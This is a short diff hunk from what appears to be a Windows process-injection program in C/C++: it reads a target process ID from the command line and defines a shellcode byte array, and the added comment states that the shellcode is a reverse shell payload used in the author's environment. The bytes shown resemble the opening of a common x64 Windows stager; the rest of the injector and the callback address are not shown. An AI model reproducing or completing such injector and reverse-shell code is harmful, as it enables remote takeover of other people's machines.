@@ -11,7 +11,7 @@ int main(int argc, char* argv[]) {
 	Sleep(400);
 
 	DWORD PID = atoi(argv[1]);
-
+//NOTE: this shellcode is a reverse shell payload that I used in my env. [CHANGE IT!!!!]
 	unsigned char shellcode[] =
 		"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
 		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
